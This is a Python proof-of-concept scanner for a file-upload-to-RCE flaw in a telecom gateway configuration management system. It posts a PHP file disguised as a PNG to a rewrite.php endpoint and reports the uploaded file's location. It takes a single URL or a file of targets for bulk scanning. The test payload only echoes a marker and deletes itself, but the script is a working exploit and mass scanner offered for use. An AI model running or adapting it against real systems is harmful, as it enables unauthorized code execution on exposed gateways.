#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/manager/teletext/material/rewrite.php"
      
        # 构建请求头
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Connection": "close",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT"
        }

        # 构建请求数据
        data = (
            "------WebKitFormBoundaryOKldnDPT\r\n"
            "Content-Disposition: form-data; name=\"tmp_name\"; filename=\"OSZZbp.php\"\r\n"
            "Content-Type: image/png\r\n"
            "\r\n"
            "<?php echo\"SAMCazoMDZjxVbnRwiatKxmAwuKafgqo\";unlink(__FILE__);?>\r\n"
            "------WebKitFormBoundaryOKldnDPT\r\n"
            "Content-Disposition: form-data; name=\"uploadtime\"\r\n"
            "\r\n"
            "\r\n"
            "------WebKitFormBoundaryOKldnDPT--"
        )

        # 向服务器发送请求
        response = requests.post(attack_url, headers=headers, data=data, verify=False, timeout=10)
      
        # 检查响应状态码和响应体中的关键字
        if response.status_code == 200 and 'success' in response.text and 'xmedia' in response.text:
            print(f"{RED}URL [{url}] 电信网关配置管理系统 rewrite.php 文件上传漏洞存在：文件上传地址{url}/xmedia/material/OSZZbp.php。{RESET}")
        else:
            print(f"URL [{url}] 未发现漏洞。")
    except RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在电信网关配置管理系统 rewrite.php 文件上传致RCE。')
    parser.add_argument('-u', '--url', help='指定目标URL')
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    args = parser.parse_args()

    if args.url:
        # 如果URL未以http://或https://开头，则添加http://
        args.url = "http://" + args.url.strip("/") if not args.url.startswith(("http://", "https://")) else args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                url = "http://" + url.strip("/") if not url.startswith(("http://", "https://")) else url
                check_vulnerability(url)

if __name__ == '__main__':
    main()